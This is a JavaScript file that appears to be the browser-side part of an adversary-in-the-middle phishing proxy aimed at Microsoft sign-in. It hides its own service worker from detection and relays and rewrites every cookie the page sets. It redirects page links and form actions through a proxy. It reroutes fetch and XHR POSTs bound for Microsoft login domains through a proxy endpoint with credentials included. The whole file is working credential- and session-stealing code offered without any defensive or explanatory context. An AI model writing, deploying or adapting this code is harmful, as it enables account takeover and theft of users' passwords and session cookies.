(function () {
    const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;
    navigator.serviceWorker.getRegistration = function (_scope) {
        return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
            .then(registration => {
                if (registration &&
                    registration.active &&
                    registration.active.scriptURL &&
                    registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {
                    return undefined;
                }
                return registration;
            });
    };
})();

(function () {
    const originalServiceWorkerGetRegistrationsDescriptor = navigator.serviceWorker.getRegistrations;
    navigator.serviceWorker.getRegistrations = function () {
        return originalServiceWorkerGetRegistrationsDescriptor.apply(this, arguments)
            .then(registrations => {
                return registrations.filter(registration => {
                    return !(registration.active &&
                        registration.active.scriptURL &&
                        registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js"));
                })
            });
    };
})();

(function () {
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");
    Object.defineProperty(document, "cookie", {
        ...originalCookieDescriptor,
        get() {
            return originalCookieDescriptor.get.call(document);
        },
        set(cookie) {
            const proxyRequestURL = `${self.location.origin}/JSCookie_6X7dRqLg90mH`;
            try {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", proxyRequestURL, false);
                xhr.setRequestHeader("Content-Type", "text/plain");
                xhr.send(cookie);
                const validDomains = JSON.parse(xhr.responseText);
                let modifiedCookie = "";
                const cookieAttributes = cookie.split(";");
                for (const cookieAttribute of cookieAttributes) {
                    let attribute = cookieAttribute.trim();
                    if (attribute) {
                        const cookieDomainMatch = attribute.match(/^DOMAIN\s*=(.*)$/i);
                        if (cookieDomainMatch) {
                            const cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                            if (cookieDomain && validDomains.includes(cookieDomain)) {
                                attribute = `Domain=${self.location.hostname}`;
                            }
                        }
                        modifiedCookie += `${attribute}; `;
                    }
                }
                originalCookieDescriptor.set.call(document, modifiedCookie.trim());
            }
            catch (error) {
                console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
            }
        }
    });
})();

// ---- Attribute rewriting (still useful for links, etc.) ----
const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        if (mutation.type === "attributes") {
            updateHTMLAttribute(mutation.target, mutation.attributeName);
        }
        else if (mutation.type === "childList") {
            for (const node of mutation.addedNodes) {
                for (const attribute of attributes) {
                    if (node[attribute]) {
                        updateHTMLAttribute(node, attribute);
                    }
                }
            }
        }
    }
});
const attributes = ["href", "action"];
observer.observe(document.documentElement, {
    childList: true,
    subtree: true,
    attributeFilter: attributes
});

function updateHTMLAttribute(htmlNode, htmlAttribute) {
    try {
        const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);
        if (htmlAttributeURL.origin !== self.location.origin) {
            const proxyRequestURL = new URL(`${self.location.origin}/Mutation_o5y3f4O7jMGW`);
            proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));
            htmlNode[htmlAttribute] = proxyRequestURL;
        }
    }
    catch { }
}

function scanAndUpdateAttributes() {
    const allElements = document.querySelectorAll('*');
    for (const el of allElements) {
        for (const attr of attributes) {
            if (el.hasAttribute(attr)) {
                updateHTMLAttribute(el, attr);
            }
        }
    }
}
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        scanAndUpdateAttributes();
        setTimeout(scanAndUpdateAttributes, 100);
    });
} else {
    scanAndUpdateAttributes();
    setTimeout(scanAndUpdateAttributes, 100);
}

// ==================== INTERCEPT FETCH AND XHR ====================
// Rewrite URLs that point to Microsoft login endpoints
const MICROSOFT_LOGIN_DOMAINS = [
    'login.microsoftonline.com',
    'login.live.com',
    'login.microsoft.com',
    'aadcdn.msauth.net',
    'aadcdn.msftauth.net'
];

function shouldInterceptUrl(url) {
    try {
        const u = new URL(url);
        return MICROSOFT_LOGIN_DOMAINS.some(domain => u.hostname.includes(domain));
    } catch { return false; }
}

function getProxyUrl(originalUrl) {
    const proxyPath = '/lNv1pC9AWPUY4gbidyBO';
    const proxyUrl = new URL(proxyPath, self.location.origin);
    proxyUrl.searchParams.set('url', originalUrl);
    return proxyUrl;
}

// ---- Intercept fetch ----
const originalFetch = window.fetch;
window.fetch = function (input, init) {
    let url = typeof input === 'string' ? input : input.url;
    if (init && init.method && init.method.toUpperCase() === 'POST' && shouldInterceptUrl(url)) {
        const proxyUrl = getProxyUrl(url);
        // Preserve the original body, headers, etc.
        const newInit = { ...init };
        // Ensure credentials are included
        newInit.credentials = 'include';
        // If body is a FormData, we need to keep it; fetch will handle it.
        return originalFetch.call(this, proxyUrl, newInit);
    }
    return originalFetch.call(this, input, init);
};

// ---- Intercept XMLHttpRequest ----
const originalXHROpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
    if (method.toUpperCase() === 'POST' && shouldInterceptUrl(url)) {
        const proxyUrl = getProxyUrl(url);
        // Save the original URL for later use in send (we need to add headers)
        this._originalUrl = url;
        this._proxyUrl = proxyUrl;
        return originalXHROpen.call(this, method, proxyUrl, async, user, password);
    }
    return originalXHROpen.call(this, method, url, async, user, password);
};

// Also intercept send to ensure we pass the original URL in a header (optional)
const originalXHRSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (this._originalUrl) {
        // Add a custom header to tell the proxy the original destination
        this.setRequestHeader('X-Original-Url', this._originalUrl);
        // Also set the URL as a query parameter in case the proxy needs it (already done via proxyUrl)
    }
    return originalXHRSend.call(this, body);
};
